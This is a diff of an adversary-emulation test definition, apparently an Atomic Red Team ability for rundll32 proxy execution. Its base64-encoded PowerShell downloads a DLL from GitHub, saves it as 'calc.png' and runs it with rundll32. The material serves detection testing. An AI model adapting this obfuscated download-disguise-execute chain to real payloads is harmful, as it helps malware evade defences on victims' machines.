@@ -1,16 +1,15 @@
-- id: 7e7d77a1-2d08-5169-8304-4071f4731a68
+- requirements: []
   name: Soumaia ART Tests - Execution of non-dll using rundll32.exe
   description: Rundll32.exe running non-dll
   tactic: stealth
-  technique:
-    attack_id: T1218.011
-    name: 'Signed Binary Proxy Execution: Rundll32'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcACQAZQBuAHYAOgB1AHMAZQByAG4AYQBtAGUAXABEAG8AdwBuAGwAbwBhAGQAcwBcAGMAYQBsAGMALgBwAG4AZwApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA0ADcALwBiAGkAbgAvAGMAYQBsAGMALgBkAGwAbAAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAdQBzAGUAcgBuAGEAbQBlAFwARABvAHcAbgBsAG8AYQBkAHMAXABjAGEAbABjAC4AcABuAGcAIgAKAA==
-          }
-          rundll32.exe C:\Users\$env:username\Downloads\calc.png, StartW
+  technique_id: T1218.011
+  technique_name: 'Signed Binary Proxy Execution: Rundll32'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcACQAZQBuAHYAOgB1AHMAZQByAG4AYQBtAGUAXABEAG8AdwBuAGwAbwBhAGQAcwBcAGMAYQBsAGMALgBwAG4AZwApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA0ADcALwBiAGkAbgAvAGMAYQBsAGMALgBkAGwAbAAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAdQBzAGUAcgBuAGEAbQBlAFwARABvAHcAbgBsAG8AYQBkAHMAXABjAGEAbABjAC4AcABuAGcAIgAKAA== }; rundll32.exe C:\Users\$env:username\Downloads\calc.png, StartW
+  id: 7e7d77a1-2d08-5169-8304-4071f4731a68
